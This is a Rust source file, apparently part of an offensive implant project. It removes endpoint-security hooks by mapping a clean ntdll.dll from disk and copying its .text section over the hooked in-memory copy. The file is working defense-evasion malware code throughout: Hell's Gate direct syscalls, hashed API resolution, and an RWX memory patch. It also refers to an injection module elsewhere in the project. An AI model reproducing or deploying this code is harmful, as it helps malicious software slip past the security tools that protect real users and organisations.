//! NTDLL unhooking — map a clean copy from disk and overwrite the hooked .text section.
//!
//! Only compiled when the `unhook_disk` feature is enabled.

#![cfg(feature = "unhook_disk")]
#![allow(dead_code, unused_imports, non_snake_case, unused_variables)]

use crate::types::*;

// ---------------------------------------------------------------------------
// unhook_ntdll
// ---------------------------------------------------------------------------

/// Map a clean copy of `ntdll.dll` from disk (via NT path) and overwrite the
/// hooked `.text` section of the in-memory copy, then clean up all handles.
///
/// This function resolves its own syscalls independently — it does not rely on
/// `G_SYS`, which may not be initialised at the time this runs.
///
/// # Safety
/// Writes directly to executable memory.  Must be called before any other
/// threads have a chance to observe the modified bytes.
pub unsafe fn unhook_ntdll() -> bool {
    // -----------------------------------------------------------------------
    // 1. Resolve ntdll base and export directory
    // -----------------------------------------------------------------------
    let ntdll_base = crate::peb::get_module_handle_h(HASH_NTDLL);
    if ntdll_base.is_null() {
        return false;
    }

    let export_dir = match crate::hellsgate::get_image_export_directory(ntdll_base) {
        Some(p) => p,
        None => return false,
    };

    // -----------------------------------------------------------------------
    // 2. Resolve local VxEntries (independent of G_SYS)
    // -----------------------------------------------------------------------
    let mut nt_create_file_e         = VxEntry::new(HASH_NT_CREATE_FILE);
    let mut nt_create_section_e      = VxEntry::new(HASH_NT_CREATE_SECTION);
    let mut nt_map_view_e            = VxEntry::new(HASH_NT_MAP_VIEW_OF_SECTION);
    let mut nt_protect_e             = VxEntry::new(HASH_NT_PROTECT_VIRTUAL_MEMORY);
    let mut nt_unmap_e               = VxEntry::new(HASH_NT_UNMAP_VIEW_OF_SECTION);
    let mut nt_close_e               = VxEntry::new(HASH_NT_CLOSE);

    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_create_file_e);
    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_create_section_e);
    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_map_view_e);
    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_protect_e);
    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_unmap_e);
    crate::hellsgate::get_vx_entry(ntdll_base, export_dir, &mut nt_close_e);

    // -----------------------------------------------------------------------
    // 3. Local syscall macro (mirrors inject.rs do_syscall!)
    // -----------------------------------------------------------------------
    macro_rules! local_syscall {
        ($entry:expr, $ftype:ty $(, $arg:expr)* $(,)?) => {
            {
                crate::syscall::HellsGate(($entry).ssn);
                let f: $ftype = core::mem::transmute(crate::syscall::HellDescent as *const ());
                f($($arg),*)
            }
        };
    }

    // -----------------------------------------------------------------------
    // 4. Build the NT path wide string for ntdll.dll
    // -----------------------------------------------------------------------
    // L"\\??\C:\Windows\System32\ntdll.dll"
    let ntdll_path: &[u16] = &[
        b'\\' as u16, b'?' as u16, b'?' as u16, b'\\' as u16,
        b'C'  as u16, b':' as u16, b'\\' as u16,
        b'W'  as u16, b'i' as u16, b'n' as u16, b'd' as u16, b'o' as u16, b'w' as u16, b's' as u16, b'\\' as u16,
        b'S'  as u16, b'y' as u16, b's' as u16, b't' as u16, b'e' as u16, b'm' as u16, b'3' as u16, b'2' as u16, b'\\' as u16,
        b'n'  as u16, b't' as u16, b'd' as u16, b'l' as u16, b'l' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
    ];
    let byte_len = (ntdll_path.len() * 2) as u16;

    let mut us_dll = UnicodeString {
        length:         byte_len,
        maximum_length: byte_len,
        buffer:         ntdll_path.as_ptr() as *mut u16,
    };

    let mut oa = ObjectAttributes {
        length:                     core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory:             core::ptr::null_mut(),
        object_name:                &mut us_dll,
        attributes:                 OBJ_CASE_INSENSITIVE,
        security_descriptor:        core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let mut iosb = IoStatusBlock { status: 0, information: 0 };

    // -----------------------------------------------------------------------
    // 5. NtCreateFile — open ntdll from disk
    // -----------------------------------------------------------------------
    type NtCreateFileFn = unsafe extern "system" fn(
        *mut HANDLE, u32, *mut ObjectAttributes, *mut IoStatusBlock,
        *mut i64, u32, u32, u32, u32, *mut u8, u32,
    ) -> NTSTATUS;

    let mut h_file: HANDLE = core::ptr::null_mut();
    let status: NTSTATUS = local_syscall!(
        nt_create_file_e, NtCreateFileFn,
        &mut h_file,
        GENERIC_READ | SYNCHRONIZE,
        &mut oa,
        &mut iosb,
        core::ptr::null_mut::<i64>(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut::<u8>(),
        0u32,
    );
    if status != STATUS_SUCCESS {
        return false;
    }

    // -----------------------------------------------------------------------
    // 6. NtCreateSection — SEC_IMAGE_NO_EXECUTE
    // -----------------------------------------------------------------------
    type NtCreateSectionFn = unsafe extern "system" fn(
        *mut HANDLE, u32, *mut ObjectAttributes,
        *mut i64, u32, u32, HANDLE,
    ) -> NTSTATUS;

    let mut h_section: HANDLE = core::ptr::null_mut();
    let status: NTSTATUS = local_syscall!(
        nt_create_section_e, NtCreateSectionFn,
        &mut h_section,
        SECTION_ALL_ACCESS,
        core::ptr::null_mut::<ObjectAttributes>(),
        core::ptr::null_mut::<i64>(),
        PAGE_READONLY,
        SEC_IMAGE_NO_EXECUTE,
        h_file,
    );
    if status != STATUS_SUCCESS {
        // close file and bail
        local_syscall!(nt_close_e, unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_file);
        return false;
    }

    // -----------------------------------------------------------------------
    // 7. NtMapViewOfSection — map the clean image into this process
    // -----------------------------------------------------------------------
    type NtMapViewFn = unsafe extern "system" fn(
        HANDLE, HANDLE, *mut *mut u8,
        usize, usize, *mut i64, *mut usize,
        u32, u32, u32,
    ) -> NTSTATUS;

    let nt_current_process = -1isize as HANDLE;
    let mut p_clean: *mut u8 = core::ptr::null_mut();
    let mut s_view: usize = 0;

    let status: NTSTATUS = local_syscall!(
        nt_map_view_e, NtMapViewFn,
        h_section,
        nt_current_process,
        &mut p_clean,
        0usize,
        0usize,
        core::ptr::null_mut::<i64>(),
        &mut s_view,
        VIEW_SHARE,
        0u32,
        PAGE_READONLY,
    );
    if status != STATUS_SUCCESS {
        local_syscall!(nt_close_e, unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_section);
        local_syscall!(nt_close_e, unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_file);
        return false;
    }

    // -----------------------------------------------------------------------
    // 8. Find the .text section in the loaded ntdll
    // -----------------------------------------------------------------------
    let dos = ntdll_base as *const ImageDosHeader;
    let nt_hdrs = (ntdll_base as usize + (*dos).e_lfanew as usize) as *mut ImageNtHeaders64;
    let num_sections = (*nt_hdrs).file_header.number_of_sections;
    let section_base =
        (nt_hdrs as usize + core::mem::size_of::<ImageNtHeaders64>()) as *mut ImageSectionHeader;

    let mut p_hooked_text: *mut u8 = core::ptr::null_mut();
    let mut p_clean_text:  *const u8 = core::ptr::null();
    let mut s_text: usize = 0;

    for i in 0..num_sections as usize {
        let sec = &*section_base.add(i);
        // Check for ".text" prefix (5 bytes)
        if sec.name.len() >= 5 && &sec.name[..5] == b".text" {
            p_hooked_text = ntdll_base.add(sec.virtual_address as usize);
            p_clean_text  = p_clean.add(sec.virtual_address as usize) as *const u8;
            s_text        = sec.virtual_size as usize;
            break;
        }
    }

    if p_hooked_text.is_null() || s_text == 0 {
        local_syscall!(nt_unmap_e,   unsafe extern "system" fn(HANDLE, *mut u8) -> NTSTATUS, nt_current_process, p_clean);
        local_syscall!(nt_close_e,   unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_section);
        local_syscall!(nt_close_e,   unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_file);
        return false;
    }

    // -----------------------------------------------------------------------
    // 9. NtProtectVirtualMemory — make .text RWX, copy, restore
    // -----------------------------------------------------------------------
    type NtProtectFn = unsafe extern "system" fn(
        HANDLE, *mut *mut u8, *mut usize, u32, *mut u32,
    ) -> NTSTATUS;

    let mut text_region = p_hooked_text;
    let mut s_region    = s_text;
    let mut ul_old_prot: u32 = 0;
    let mut ul_dummy:    u32 = 0;

    local_syscall!(
        nt_protect_e, NtProtectFn,
        nt_current_process,
        &mut text_region,
        &mut s_region,
        PAGE_EXECUTE_READWRITE,
        &mut ul_old_prot,
    );

    // Overwrite hooked .text with clean copy
    core::ptr::copy_nonoverlapping(p_clean_text, p_hooked_text, s_text);

    // Restore original protection
    local_syscall!(
        nt_protect_e, NtProtectFn,
        nt_current_process,
        &mut text_region,
        &mut s_region,
        ul_old_prot,
        &mut ul_dummy,
    );

    // -----------------------------------------------------------------------
    // 10. Cleanup
    // -----------------------------------------------------------------------
    local_syscall!(nt_unmap_e, unsafe extern "system" fn(HANDLE, *mut u8) -> NTSTATUS, nt_current_process, p_clean);
    local_syscall!(nt_close_e, unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_section);
    local_syscall!(nt_close_e, unsafe extern "system" fn(HANDLE) -> NTSTATUS, h_file);

    true
}
